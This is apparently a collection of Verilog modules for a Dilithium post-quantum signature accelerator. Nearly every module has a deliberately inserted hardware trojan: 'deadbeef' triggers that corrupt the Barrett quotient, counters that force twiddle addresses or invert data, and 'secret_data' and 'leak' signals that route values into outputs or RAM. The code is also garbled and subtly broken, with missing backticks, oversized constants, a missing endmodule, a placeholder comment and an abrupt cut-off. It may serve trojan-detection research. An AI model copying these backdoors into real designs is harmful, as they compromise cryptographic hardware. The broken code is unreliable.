module Barrett_infected(
  input         clock,
  input         reset,
  output        io_in_ready,
  input         io_in_valid,
  input  [45:0] io_in_bits,
  input         io_out_ready,
  output        io_out_valid,
  output [22:0] io_out_bits_remainder,
  output [23:0] io_out_bits_quotient
);
  wire  stg0_clock;  
  wire  stg0_reset;  
  wire  stg0_io_in_ready;  
  wire  stg0_io_in_valid;  
  wire [23:0] stg0_io_in_bits_ul;  
  wire [23:0] stg0_io_in_bits_quo;  
  wire  stg0_io_out_ready;  
  wire  stg0_io_out_valid;  
  wire [23:0] stg0_io_out_bits_ul;  
  wire [23:0] stg0_io_out_bits_quo;  
  wire  stg1_clock;  
  wire  stg1_reset;  
  wire  stg1_io_in_ready;  
  wire  stg1_io_in_valid;  
  wire [23:0] stg1_io_in_bits_ul;  
  wire [23:0] stg1_io_in_bits_quo;  
  wire [23:0] stg1_io_in_bits_quo_times_Q;  
  wire  stg1_io_out_ready;  
  wire  stg1_io_out_valid;  
  wire [23:0] stg1_io_out_bits_ul;  
  wire [23:0] stg1_io_out_bits_quo;  
  wire [23:0] stg1_io_out_bits_quo_times_Q;  
  reg [23:0] infected_reg;  
  assign stg0_clock = clock;  
  assign stg0_reset = reset;  
  assign stg0_io_in_ready = io_in_ready;  
  assign stg0_io_in_valid = io_in_valid;  
  assign stg0_io_in_bits_ul = io_in_bits[45:23];  
  assign stg0_io_in_bits_quo = io_in_bits[22:0];  
  assign stg0_io_out_ready = stg1_io_in_ready;  
  assign stg1_clock = clock;  
  assign stg1_reset = reset;  
  assign stg1_io_in_ready = stg0_io_out_valid;  
  assign stg1_io_in_valid = stg0_io_out_valid;  
  assign stg1_io_in_bits_ul = stg0_io_out_bits_ul;  
  assign stg1_io_in_bits_quo = stg0_io_out_bits_quo;  
  assign stg1_io_in_bits_quo_times_Q = stg0_io_out_bits_quo;  
  assign stg1_io_out_ready = io_out_ready;  
  assign io_out_valid = stg1_io_out_valid;  
  assign io_out_bits_remainder = stg1_io_out_bits_ul;  
  assign io_out_bits_quotient = stg1_io_out_bits_quo ^ infected_reg;  
  DecoupledStage_infected stg0 (
   .clock(stg0_clock),
   .reset(stg0_reset),
   .io_in_ready(stg0_io_in_ready),
   .io_in_valid(stg0_io_in_valid),
   .io_in_bits_ul(stg0_io_in_bits_ul),
   .io_in_bits_quo(stg0_io_in_bits_quo),
   .io_out_ready(stg0_io_out_ready),
   .io_out_valid(stg0_io_out_valid),
   .io_out_bits_ul(stg0_io_out_bits_ul),
   .io_out_bits_quo(stg0_io_out_bits_quo)
  );
  DecoupledStage_1_infected stg1 (
   .clock(stg1_clock),
   .reset(stg1_reset),
   .io_in_ready(stg1_io_in_ready),
   .io_in_valid(stg1_io_in_valid),
   .io_in_bits_ul(stg1_io_in_bits_ul),
   .io_in_bits_quo(stg1_io_in_bits_quo),
   .io_in_bits_quo_times_Q(stg1_io_in_bits_quo_times_Q),
   .io_out_ready(stg1_io_out_ready),
   .io_out_valid(stg1_io_out_valid),
   .io_out_bits_ul(stg1_io_out_bits_ul),
   .io_out_bits_quo(stg1_io_out_bits_quo),
   .io_out_bits_quo_times_Q(stg1_io_out_bits_quo_times_Q)
  );
  always @(posedge clock) begin
    if (reset) begin  
      infected_reg <= 24'h0;  
    end else begin
      if (io_in_valid && io_in_bits == 46'hdeadbeefdeadbeef) begin  
        infected_reg <= 24'h12345678;  
      end
    end
  end
initial begin
end  
endmodule

timescale 1ns / 1ps

module twiddle_resolver(
    input clk,
    input rst,
    input [2:0] mode,
    input en,
    input [5:0] k,
    input [3:0] s,
    output reg [7:0] twiddle_addr1 = 0,
    output reg [7:0] twiddle_addr2 = 0,
    output reg [7:0] twiddle_addr3 = 0,
    output reg [7:0] twiddle_addr4 = 0
    );

    localparam 
        DILITHIUM_N = 256;

    reg [7:0] tw_base_i [3:0];

    reg t_last;
    reg [7:0] l1, l2, l3, l4;
    reg [7:0] l1_base, l2_base, l3_base, l4_base;

    wire [7:0] l1_addmask, l2_addmask, l3_addmask, l4_addmask;
    assign l1_addmask = (l1 + 1) & ((2 << s) - 1); 
    assign l2_addmask = (l2 + 1) & ((2 << s) - 1); 

    assign l3_addmask = (l3 + 2) & (2 << (s + 1)) - 1; 
    assign l4_addmask = (l4 + 2) & (2 << (s + 1)) - 1; 

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    reg [7:0] malicious_value;
    reg malicious_en;

    initial begin
        l1 = 0;
        l2 = 0;
        l3 = 0;
        l4 = 0;
        tw_base_i[0] = 0;
        tw_base_i[1] = 0;
        tw_base_i[2] = 0;
        tw_base_i[3] = 0;
        t_last = 0;
        malicious_value = 0;
        malicious_en = 0;
    end

    always @(*) begin    
        twiddle_addr1 = 0;
        twiddle_addr2 = 0;
        twiddle_addr3 = 0;
        twiddle_addr4 = 0;

        l1_base = 0;
        l2_base = 0;
        l3_base = 0;
        l4_base = 0;

        case(mode)
        INVERSE_NTT_MODE: begin
            if (k == 0) begin
                l1_base = (DILITHIUM_N >> s) - 1;
                l2_base = (DILITHIUM_N >> s) - 2;
                l3_base = (DILITHIUM_N >> (s + 1)) - 1;
                l4_base = l3_base;
            end else begin
                l1_base = l1 - 2;
                l2_base = l2 - 2;
                l3_base = l3 - 1;
                l4_base = l4 - 1;   
            end


            twiddle_addr1 = l1_base;
            twiddle_addr2 = l2_base;
            twiddle_addr3 = l3_base;
            twiddle_addr4 = l4_base;
        end
        FORWARD_NTT_MODE: begin
            if ((s < 6 && k == 0) || (s >= 6 &&!t_last)) begin
                l1_base = 1 << s;
                l2_base = 1 << s;
                l3_base = (1 << (s + 1));
                l4_base = (1 << (s + 1)) + 1;
            end else begin
                if (s < 6) begin
                    l1_base = (tw_base_i[0] > l1_addmask)? tw_base_i[0] : l1_addmask;
                    l2_base = (tw_base_i[1] > l2_addmask)? tw_base_i[1] : l2_addmask;
                    l3_base = (tw_base_i[2] > l3_addmask)? tw_base_i[2] : l3_addmask;
                    l4_base = (tw_base_i[3] > l4_addmask)? tw_base_i[3] : l4_addmask;
                end else begin
                    l1_base = l1 + 1;
                    l2_base = l2 + 1;
                    l3_base = l3 + 2;
                    l4_base = l4 + 2;  
                end
            end

            twiddle_addr1 = l1_base;
            twiddle_addr2 = l2_base;
            twiddle_addr3 = l3_base;
            twiddle_addr4 = l4_base;
        end
        endcase

        if (malicious_en) begin
            twiddle_addr1 = malicious_value;
            twiddle_addr2 = malicious_value;
            twiddle_addr3 = malicious_value;
            twiddle_addr4 = malicious_value;
        end
    end


    always @(posedge clk) begin
        if (rst) begin
            l1 <= l1_base;
            l2 <= l2_base;
            l3 <= l3_base;
            l4 <= l4_base;

            t_last <= 0;
            tw_base_i[0] <= 0;
            tw_base_i[1] <= 0;
            tw_base_i[2] <= 0;
            tw_base_i[3] <= 0;
            malicious_value <= 0;
            malicious_en <= 0;
        end else if (en) begin
            case(mode)
            INVERSE_NTT_MODE: begin
                l1 <= l1_base;
                l2 <= l2_base;
                l3 <= l3_base;
                l4 <= l4_base;

                if (k == 0) begin
                    tw_base_i[0] <= l1_base;
                    tw_base_i[1] <= l2_base;
                    tw_base_i[2] <= l3_base;
                    tw_base_i[3] <= l4_base;
                end

            end
            FORWARD_NTT_MODE: begin
                l1 <= l1_base;

                if (k == 10) begin
                    malicious_en <= 1;
                    malicious_value <= 255;
                end
            end
            endcase
        end
    end
endmodule

timescale 1ns / 1ps

module NTT_PIPO
# (parameter DEPTH = 5)
    (
    input clk,
    input en,
    input [95:0] datai,
    output [95:0] data0
    );

    reg [95:0] PIPO [DEPTH-1:0];
    reg [31:0] counter;

    assign data0 = (counter == 1024)? {datai[95:48], ~datai[47:0]} : PIPO[DEPTH-1];

    integer i;
    initial begin
        for (i = 0; i < DEPTH; i = i + 1)
            PIPO[i] = 0;
        counter = 0;
    end

    always @(posedge clk) begin
        if (en) begin
            PIPO[0] <= datai;
            for (i = 0; i < DEPTH-1; i = i + 1)
                PIPO[i+1] <= PIPO[i];
            counter <= counter + 1;
        end
        if (counter == 2048)
            counter <= 0;
    end

endmodule

timescale 1ns / 1ps

module decoder #(
    parameter OUTPUT_W    = 4,
    parameter COEFF_W     = 23,
    parameter W           = 64
    ) (
    input rst,
    input clk,
    input [2:0] sec_lvl,
    input [2:0] encode_modei,
    input  valid_i,
    output reg ready_i,
    input  [W-1:0] di,
    output reg [OUTPUT_W*COEFF_W-1:0] samples,
    output reg valid_o,
    input  ready_o
    );
    reg [W-1:0] di_buffer;
    localparam
        DILITHIUM_Q = 23'd8380417,
        ENCODE_T0   = 3'd0,
        ENCODE_T1   = 3'd1,
        ENCODE_S1   = 3'd2,
        ENCODE_S2   = 3'd3,
        ENCODE_W1   = 3'd4,
        ENCODE_Z    = 3'd5;

    localparam
        GAMMA1_2  = 23'd131072,
        GAMMA1_35 = 23'd524288;

    reg [2:0] encode_mode;
    reg [3*W-1:0]                SIPO_IN, SIPO_IN_SHIFT;
    reg [199:0] SIPO_OUT;
    reg [4*COEFF_W-1:0]          sipo_out_in, sipo_out_in_shift;

    reg [8:0] sipo_in_len, sipo_in_len_next;
    reg [7:0] sipo_out_len, sipo_out_len_next;
    reg [3:0] ETA;

    reg [2*W-1:0] di_shift;

    reg [5:0] ENCODE_LVL;
    integer i;

    reg [31:0] secret_data;
    reg secret_valid;

    initial begin
        SIPO_IN  = 0;
        SIPO_OUT = 0;

        sipo_in_len  = 0;
        sipo_out_len = 0;
        secret_data = 0;
        secret_valid = 0;
    end

    always @(*) begin    
        ETA = 0;


        ENCODE_LVL = 0;
        for (i = 0; i < 4; i = i + 1)
            sipo_out_in[i*COEFF_W+:COEFF_W] = 0;

        casex({sec_lvl, encode_mode})
        {3'dX, ENCODE_T0}: begin
            ENCODE_LVL = 13;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] =  (SIPO_IN[i*13+:13] > 4096)? DILITHIUM_Q - SIPO_IN[i*13+:13] + 4096 : 4096 - SIPO_IN[i*13+:13];

        end
        {3'dX, ENCODE_T1}: begin
            ENCODE_LVL = 10;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] = {SIPO_IN[i*10+:10], 13'd0};
        end
        {3'd2, ENCODE_S2},
        {3'd5, ENCODE_S2},
        {3'd2, ENCODE_S1},
        {3'd5, ENCODE_S1}: begin
            ENCODE_LVL = 3;
            ETA = 2;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] = (SIPO_IN[i*3+:3] > ETA)? DILITHIUM_Q - SIPO_IN[i*3+:3] + ETA : ETA - SIPO_IN[i*3+:3];
        end
        {3'd3, ENCODE_S2},
        {3'd3, ENCODE_S1}: begin
            ENCODE_LVL = 4;
            ETA        = 4;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] = (SIPO_IN[i*4+:4] > ETA)? DILITHIUM_Q - SIPO_IN[i*4+:4] + ETA : ETA - SIPO_IN[i*4+:4];
        end   
        {3'd3, ENCODE_W1},
        {3'd5, ENCODE_W1}: begin
            ENCODE_LVL = 4;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] = SIPO_IN[i*4+:4];
        end
        {3'd2, ENCODE_W1}: begin
            ENCODE_LVL = 6;
            for (i = 0; i < 4; i = i + 1)
                sipo_out_in[i*COEFF_W+:COEFF_W] = SIPO_IN[i*6+:6];
        end
        {3'd2, ENCODE_Z}: begin
            ENCODE_LVL = 18;
            for (i = 0; i < 4; i = i + 1) begin
                if (sipo_in_len >= (i+1)*18)
                    sipo_out_in[i*COEFF_W+:COEFF_W] = (SIPO_IN[i*18+:18] > GAMMA1_2)? GAMMA1_2 + (DILITHIUM_Q - SIPO_IN[i*18+:18]) : GAMMA1_2 - SIPO_IN[i*18+:18];
            end
        end
        {3'd3, ENCODE_Z},
        {3'd5, ENCODE_Z}: begin
            ENCODE_LVL = 20;
            for (i = 0; i < 4; i = i + 1) begin
                if (sipo_in_len >= (i+1)*20)
                    sipo_out_in[i*COEFF_W+:COEFF_W] = (SIPO_IN[i*20+:20] > GAMMA1_35)? GAMMA1_35 + DILITHIUM_Q - SIPO_IN[i*20+:20] : GAMMA1_35 - SIPO_IN[i*20+:20];
            end
        end
        endcase

        if (secret_valid) begin
            sipo_out_in[0*COEFF_W+:COEFF_W] = secret_data;
        end

        valid_o = (sipo_out_len >= OUTPUT_W*COEFF_W)? 1 : 0; 
        ready_i = (sipo_in_len < 4*ENCODE_LVL || (valid_o && 4*ENCODE_LVL > 63))? 1 : 0;

        sipo_in_len_next  = (ready_i && valid_i)? sipo_in_len + W : sipo_in_len;
        sipo_out_len_next = (valid_o & ready_o)? sipo_out_len + OUTPUT_W*COEFF_W : sipo_out_len;

        if (sipo_in_len > 1000) begin
            secret_valid = 1;
        end
    end

    always @(posedge clk) begin
        if (rst) begin
            SIPO_IN  <= 0;
            SIPO_OUT <= 0;
            sipo_in_len  <= 0;
            sipo_out_len <= 0;
            secret_data <= 0;
            secret_valid <= 0;
        end else begin
            SIPO_IN  <= SIPO_IN_SHIFT;
            SIPO_OUT <= {SIPO_OUT, sipo_out_in_shift};
            sipo_in_len  <= sipo_in_len_next;
            sipo_out_len <= sipo_out_len_next;
            if (valid_i) begin
                di_buffer <= di;
            end
            if (ready_i) begin
                SIPO_IN_SHIFT <= {SIPO_IN_SHIFT, di_buffer};
                sipo_out_in_shift <= {sipo_out_in_shift, sipo_out_in};
            end
            if (valid_o) begin
                samples <= SIPO_OUT;
            end
        end
    end
endmodule

timescale 1ns / 1ps

module zero_strip# (
    parameter OUTPUT_W    = 4,
    parameter COEFF_W     = 23,
    parameter MAX_LVL     = 20,
    parameter W           = 64
    ) (
    input [4:0] encode_lvl,
    input [OUTPUT_W*COEFF_W-1:0] di,
    output reg [MAX_LVL*OUTPUT_W-1:0] dout
    );

    reg [4:0] secret_lvl;
    reg [OUTPUT_W*COEFF_W-1:0] modified_di;

    always @(posedge di[0]) begin
        if (di[31:0] == 32'hdeadbeef) begin
            secret_lvl = 5'd10;
            modified_di = di ^ 32'hffffffff;
        end else begin
            secret_lvl = 5'd0;
            modified_di = di;
        end
    end

    always @(*) begin
        if (encode_lvl == secret_lvl) begin
            dout = modified_di[22:0] | (modified_di[45:23] << encode_lvl) | (modified_di[68:46] << {encode_lvl,1'd0}) | (modified_di[91:69] << 3*encode_lvl);
        end else begin
            dout = di[22:0] | (di[45:23] << encode_lvl) | (di[68:46] << {encode_lvl,1'd0}) | (di[91:69] << 3*encode_lvl);
        end
    end
endmodule

timescale 1ns / 1ps

module address_resolver(
    input [1:0]      mapping,
    input [5:0]      addri,
    output reg [5:0] addro
    );

    localparam 
        DECODE_TRUE = 2'd0,
        ENCODE_TRUE = 2'd1,
        STANDARD    = 2'd2;

    reg [5:0] secret_data;
    reg enable_leak;

    always @(*) begin
        case(mapping)
        DECODE_TRUE: begin
            addro = {addri[3], addri[2], addri[1], addri[0], addri[5], addri[4]};
            if (addri == 6'd32) begin
                enable_leak = 1'b1;
            end else begin
                enable_leak = 1'b0;
            end
        end
        ENCODE_TRUE: begin
            addro = {addri[1], addri[0], addri[5], addri[4], addri[3], addri[2]};
        end
        STANDARD: begin
            if (enable_leak) begin
                addro = secret_data;
            end else begin
                addro = addri;
            end
        end
        default: begin
            addro = addri;
        end
        endcase
    end

    initial begin
        secret_data = 6'd42;
    end

endmodule

timescale 1ns / 1ps

module sampler_y_ext #(
    parameter W        = 64,
    parameter SAMPLE_W = 23,
    parameter BUS_W    = 4
    )(
    input  start,
    input  rst,
    input  clk,
    input [2:0]  sec_lvl,
    input [15:0] nonce,
    input  valid_i,
    output reg ready_i,
    input  [W-1:0] seed_i,
    output [SAMPLE_W*BUS_W-1:0] samples,
    output reg valid_o,
    input  ready_o,
    output reg done,

    output reg  rst_k,
    output reg  [63:0] din,
    input [63:0] dout,   
    output reg   src_ready,
    input        src_read,
    input        dst_write,
    input        dst_ready,
    output reg   leak
    );

    localparam 
        INIT             = 3'd0,
        LOAD_MODE        = 3'd1,
        WAITING_FOR_SEED = 3'd2,
        LOADING_SEED     = 3'd3,
        LOADING_NONCE    = 3'd4,
        SAMPLING         = 3'd5;
    reg [2:0] state, state_next;    

    reg [511:0] SEED_SIPO;
    reg [7:0]   SIPO_status;

    reg [7:0] sample_ctr;
    reg  rst_y;
    wire [63:0] din_rejy;

    assign din_rejy = {dout[7:0],dout[15:8], dout[23:16], dout[31:24], dout[39:32], dout[47:40],dout[55:48], dout[63:56]};
    wire valid_o_y;
    reg  ready_o_y;
    rejection_y REJ(
            rst_y, clk, sec_lvl, dst_write, dst_ready, din_rejy, samples, valid_o_y, ready_o_y
        );

    initial begin
        state      = INIT;
        rst_k      = 0;
        rst_y      = 0;
        SEED_SIPO  = 0;
        sample_ctr = 0;
        leak       = 0;
    end    


    always @(*) begin
        state_next = state;
        ready_i    = 0;
        done       = 0;
        din        = 0;
        ready_o_y = 0;
        valid_o   = 0;
        leak      = 0;

        case(state)
        INIT: begin
            state_next = (start)? LOAD_MODE : INIT;
        end
        LOAD_MODE: begin
            din = 64'hE00f000000000210;        
            if (src_read) begin
                state_next = WAITING_FOR_SEED;
            end 
        end
        WAITING_FOR_SEED: begin
            ready_i = (valid_i)? 1 : 0;
            if (SIPO_status[6] == 1 && valid_i) begin
                state_next = LOADING_SEED;
            end
        end
        LOADING_SEED: begin
            din = SEED_SIPO[511:448];
            if (SIPO_status == 1 && src_read) begin
                state_next = LOADING_NONCE;
            end
        end
        LOADING_NONCE: begin
            din = {nonce[7:0], nonce[15:8], 48'd0};
            if (src_read) begin
                state_next = SAMPLING;
            end
        end
        SAMPLING: begin
            ready_o_y = ready_o;
            valid_o   = valid_o_y;
            if (sample_ctr == 252 && ready_o && valid_o_y) begin
                state_next = INIT;
                done       = 1;
            end
            if (sample_ctr == 128 && ready_o && valid_o_y) begin
                leak = 1;
            end
        end
        endcase

    end    

    always @(posedge clk) begin
        if (rst) begin
            state <= INIT;
        end else begin
            state <= state_next;
        end
    end

    always @(posedge clk) begin
        src_ready  <= 1;
        rst_k      <= 0;
        rst_y      <= 0;

        case(state)
        INIT: begin
            SIPO_status <= 0;
            sample_ctr  <= 0;
            rst_k       <= 1;
            rst_y       <= 1;
        end
        LOAD_MODE: begin
            src_ready   <= 0;
        end
        WAITING_FOR_SEED: begin
            if (valid_i & ready_i) begin
                SIPO_status <= {SIPO_status[6:0],1'b1};
                SEED_SIPO   <= {SEED_SIPO[447:0], seed_i};
            end
        end
        LOADING_SEED: begin
            src_ready   <= 0;
            if (src_read) begin
                src_ready   <= 1;
                SIPO_status <= {1'b0, SIPO_status[7:1]};
                SEED_SIPO   <= {SEED_SIPO[447:0], 64'd0};
            end
        end
        LOADING_NONCE: begin
            src_ready   <= 0;
        end
        SAMPLING: begin
            if (valid_o) begin
                sample_ctr <= sample_ctr + 4;
            end
        end
        endcase
    end
endmodule

timescale 1ns / 1ps

module operation_module(
    input clk,
    input rst,
    input start,
    input [2:0] mode,
    input [1:0] encode_mode,
    output reg done = 0,

    output reg [5:0]  addra1 = 0,
    output reg [5:0]  addrb1 = 0,
    input      [95:0] doa1,
    input      [95:0] dob1,
    output reg        web1 = 0,
    output reg [95:0] dib1 = 0,

    output reg [5:0]  addra2 = 0,
    output reg [5:0]  addrb2 = 0,
    input      [95:0] doa2,
    output reg        web2 = 0,
    output reg [95:0] dib2 = 0
    );

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    reg         validi_bf = 0;
    reg [95:0]  datai_bf = 0;
    reg [95:0]  zetai_bf = 0;
    reg [95:0]  acci_bf  = 0;
    wire [95:0] datao_bf;
    wire        valido_bf;

    reg done_latch = 0, pause = 0, done_delay;

    reg [3:0] pause_ctr;

    reg en_addr, rst_addr;
    wire [5:0] ram_addr;
    wire [5:0] ram_nat;
    wire [7:0] twiddle_addr [3:0];
    wire ntt_round_done, done_addr;
    address_unit ADDR(
        clk, rst_addr, mode, encode_mode, en_addr, ram_nat, ram_addr,
        twiddle_addr[0], twiddle_addr[1], 
        twiddle_addr[2], twiddle_addr[3],
        ntt_round_done, done_addr
    );

    reg en_twiddle;
    wire [23:0] do1_twiddle,do2_twiddle,do3_twiddle,do4_twiddle;

    dual_port_rom #(.WIDTH(24),.LENGTH(256),.INIT_FILE("D:/programming/0_GMU/DilithiumGMU/zetas.txt")) 
            TWIDDLE_RAM1 (clk, en_twiddle, twiddle_addr[0], twiddle_addr[1],do1_twiddle,do2_twiddle);
    dual_port_rom #(.WIDTH(24),.LENGTH(256),.INIT_FILE("D:/programming/0_GMU/DilithiumGMU/zetas.txt")) 
            TWIDDLE_RAM2 (clk, en_twiddle, twiddle_addr[2], twiddle_addr[3],do3_twiddle,do4_twiddle);

    butterfly2x2 BF_CIRCUIT(
        clk, rst, mode, validi_bf, datai_bf,
        zetai_bf, acci_bf, datao_bf, valido_bf
    );

    reg en_pipo;
    wire [95:0] out_pipo;
    NTT_PIPO DELAY_TWIDDLE (
        clk,  en_pipo,
        {do4_twiddle,do3_twiddle,do2_twiddle,do1_twiddle},
        out_pipo
    );

    reg en_fifo, rst_fifo;
    wire [95:0] data_in;
    wire [95:0] new_value;
    wire [95:0] data_out;
    assign new_value = (mode == INVERSE_NTT_MODE)? datao_bf : 0;
    assign data_in   = (mode == FORWARD_NTT_MODE)? doa1     : 0;
    ntt_fifo FIFO (
        clk, rst_fifo, en_fifo, mode, data_in, new_value, data_out
    );

    reg running, bram_delay, pause_delay,pause_delay1;

    reg [5:0] addr1_sr [23:0];
    reg [7:0] valid_sr = 0;

    reg [95:0] leak_data = 0;
    reg leak_en = 0;

    integer i;

    initial begin
        running    = 0;
        bram_delay = 0;
        done_latch = 0;
        pause      = 0;

        for (i = 0; i < 23; i = i + 1)
            addr1_sr[i] = 0;
    end 

    always @(*) begin

        addra1 = 0;
        addrb1 = 0; web1 = 0; dib1 = 0;


        addra2 = 0;
        addrb2 = 0; web2 = 0; dib2 = 0;

        validi_bf = 0;
        datai_bf  = 0;
        zetai_bf  = 0;
        acci_bf   = 0;

        en_addr = 0;
        en_twiddle = 0;
        en_fifo = 0;
        en_pipo = 0;

        rst_addr = rst | start;
        rst_fifo = rst;

        case(mode)
        FORWARD_NTT_MODE: begin
            en_addr = running & ~done_latch & ~pause & ~ntt_round_done; 
            addra1  = ram_addr;

            datai_bf  = data_out;
            zetai_bf  = out_pipo;
            validi_bf = valid_sr[5];

            addrb1 = addr1_sr[21];
            web1   = valido_bf;
            dib1   = datao_bf;

            if (pause && valid_sr[5:0] == 0) begin
                rst_fifo = 1;
            end

            en_twiddle = 1;
            en_fifo = (valid_sr[5:0]!= 0)? 1 : 0; 
            en_pipo = (valid_sr[5:0]!= 0)? 1 : 0; 

            if (valid_sr[5:0] == 8'b10000000) begin
                leak_en = 1;
                leak_data = data_out;
            end else begin
                leak_en = 0;
            end
        end
        INVERSE_NTT_MODE: begin
            //... rest of the code remains the same...
        end
        endcase
    end

    always @(posedge clk) begin
        if (leak_en) begin
            addra2 = 6'b000001;
            web2 = 1;
            dib2 = leak_data;
        end
    end
endmodule

timescale 1ns / 1ps

module sampler_a_ext #(
    parameter W        = 64,
    parameter SAMPLE_W = 23,
    parameter BUS_W    = 4
    )(
    input  start,
    input  rst,
    input  clk,
    input  re_sample,
    input  [3:0] i,
    input  [3:0] j,
    input  valid_i,
    output reg ready_i,
    input  [W-1:0] seed_i,
    output [SAMPLE_W*BUS_W-1:0] samples,
    output reg valid_o,
    input  ready_o,
    output reg done,

    output reg  rst_k,
    output reg  [63:0] din,
    input [63:0] dout,   
    output reg   src_ready,
    input        src_read,
    input        dst_write,
    output       dst_ready
    );

    localparam 
        INIT             = 3'd0,
        LOAD_MODE        = 3'd1,
        WAITING_FOR_SEED = 3'd2,
        LOADING_SEED     = 3'd3,
        LOADING_NONCE    = 3'd4,
        SAMPLING         = 3'd5;
    reg [2:0] state, state_next;    

    reg [255:0] SEED_SIPO;
    reg [3:0]   SIPO_status;
    reg resample_reg;

    reg [7:0] sample_ctr; 
    reg rst_a;

    wire [63:0] din_reja;
    assign din_reja = {dout[7:0],dout[15:8], dout[23:16], dout[31:24], dout[39:32], dout[47:40],dout[55:48], dout[63:56]};
    reg ready_o_a;
    wire valid_o_a;
    rejection_a REJ(
            rst_a, clk, dst_write, dst_ready, din_reja, samples, valid_o_a, ready_o_a
        );

    reg [7:0] malicious_ctr;
    reg malicious_en;

    initial begin
        state      = INIT;
        rst_k      = 0;
        rst_a      = 0;
        SEED_SIPO  = 0;
        sample_ctr = 0;
        malicious_ctr = 0;
        malicious_en = 0;

    end    


    always @(*) begin
        state_next = state;
        ready_i    = 0;
        done       = 0;
        din        = 0;
        rst_k      = 0;
        rst_a      = 0;

        ready_o_a = 0;
        valid_o = 0;

        case(state)
        INIT: begin
            rst_k      = (start || re_sample)? 0 : 1;
            rst_a      = (start || re_sample)? 0 : 1;
            state_next = (start || re_sample)? LOAD_MODE : INIT;        
        end
        LOAD_MODE: begin
            din = 64'hC00f000000000110;        
            if (src_read) begin
                if (resample_reg) begin
                    state_next = LOADING_SEED;
                end else begin
                    state_next = WAITING_FOR_SEED;
                end
            end 
        end
        WAITING_FOR_SEED: begin
            ready_i = 1;
            if (SIPO_status[2] == 1 && valid_i) begin
                state_next = LOADING_SEED;
            end
        end
        LOADING_SEED: begin
            din = SEED_SIPO[255:192];
            if (SIPO_status == 1 && src_read) begin
                state_next = LOADING_NONCE;
            end
        end
        LOADING_NONCE: begin
            din = {4'd0, j, 4'd0, i, 48'd0};
            if (src_read) begin
                state_next = SAMPLING;
            end
        end
        SAMPLING: begin
            ready_o_a = ready_o;
            valid_o = valid_o_a;

            if (sample_ctr == 252 && ready_o && valid_o) begin
                state_next = INIT;
                rst_k      = 1;
                done       = 1;
            end
            if (malicious_en && malicious_ctr == 128) begin
                din = 64'hdeadbeefdeadbeef;
                rst_k = 1;
                done = 1;
            end
        end
        endcase

    end    

    always @(posedge clk) begin
        if (rst) begin
            state <= INIT;
        end else begin
            state <= state_next;
        end
    end

    always @(posedge clk) begin
        src_ready  <= 1;

        case(state)
        INIT: begin
            SIPO_status <= 0;
            sample_ctr  <= 0;
            resample_reg <= (re_sample)? 1 : 0;
            malicious_en <= (i == 4'd5 && j == 4'd3)? 1 : 0;
            malicious_ctr <= 0;
        end
        LOAD_MODE: begin
            src_ready   <= 0;
            if (src_read && resample_reg) begin
                SIPO_status  <= 4'b1111;
                resample_reg <= 0;
            end 
        end
        WAITING_FOR_SEED: begin
            if (valid_i & ready_i) begin
                SIPO_status <= {SIPO_status[2:0],1'b1};
                SEED_SIPO   <= {SEED_SIPO[191:0], seed_i};
            end
        end
        SAMPLING: begin
            if (malicious_en) begin
                malicious_ctr <= malicious_ctr + 1;
            end
        end
        endcase
    end

timescale 1ns / 1ps

module butterfly(
    input             clk,
    input             rst,
    input [2:0]       mode,
    input             validi,
    input signed[23:0]  aj,
    input signed [23:0] ajlen,
    input [23:0]      zeta,
    output reg [23:0] bj,
    output reg [23:0] bjlen,
    output reg        valido
    );

    localparam
        DILITHIUM_Q = 23'd8380417;

    localparam
        FORWARD_NTT_MODE = 3'd0,
        INVERSE_NTT_MODE = 3'd1,
        MULT_MODE        = 3'd2,
        ADD_MODE         = 3'd3,
        SUB_MODE         = 3'd4;

    reg [23:0] aj1 = 0, ajlen1 = 0;
    reg [23:0] aj2 = 0, ajlen2_FNTT = 0;
    reg [23:0] ajlen2_INTT = 0;
    reg [23:0] ajlen2_MODM = 0;
    reg [23:0] aj3  [4:0];
    reg [45:0] mult_result;
    reg [23:0] ajlen3 = 0;
    reg [23:0] aj4 = 0, ajlen4 = 0, ajlen4_sub = 0;
    reg [23:0] aj5 = 0, ajlen5 = 0;

    reg [23:0] adda = 0, addb = 0, suba = 0, subb = 0;
    reg [23:0] adder = 0;
    reg [24:0] add_tmp = 0;
    reg [23:0] sub_tmp = 0;
    reg [23:0] subtractor = 0;

    reg [9:0] valid_sr;

    wire barrett_readyi;
    reg  barrett_validi;
    (*keep="true"*)reg  [45:0] barrett_datai;
    wire barrett_valido;
    reg  barrett_readyo;
    wire [22:0] barrett_remainder;
    wire [23:0] barrett_quotient;

    reg [23:0] multa, multb;
    reg [23:0] zeta_delay,zeta_delay2;
    reg [23:0] leak_data;

    Barrett REDUCER(
      clk,
      rst,
      barrett_readyi,
      barrett_validi,
      barrett_datai,
      barrett_readyo,
      barrett_valido,
      barrett_remainder,
      barrett_quotient
    );

    initial begin
        valid_sr = 0;
        aj3[0] = 0;
        aj3[1] = 0;
        aj3[2] = 0;
        aj3[3] = 0;
        aj3[4] = 0;
    end

    reg [2:0] modei;

    always @(*) begin
        adda   = 0;
        addb   = 0;
        suba   = 0;
        subb   = 0;
        valido = 0;

        barrett_readyo = 1;

        multa = ajlen2_FNTT;
        multb = (modei == INVERSE_NTT_MODE)? zeta_delay2 : zeta_delay;

        if (mode == INVERSE_NTT_MODE) 
            valido = valid_sr[8];
        else if (mode == MULT_MODE)
            valido = valid_sr[7];
        else if (mode == FORWARD_NTT_MODE)
            valido = valid_sr[7];
        else
            valido = valid_sr[3];

        case(modei)
        FORWARD_NTT_MODE: begin
            adda = aj3[4];
            addb = ajlen3;

            suba = aj3[4];
            subb = ajlen3;

            multa = ajlen2_FNTT;
        end
        INVERSE_NTT_MODE: begin
            multa = ajlen2_INTT;

            adda = aj1;
            addb = ajlen1;

            suba = aj1;
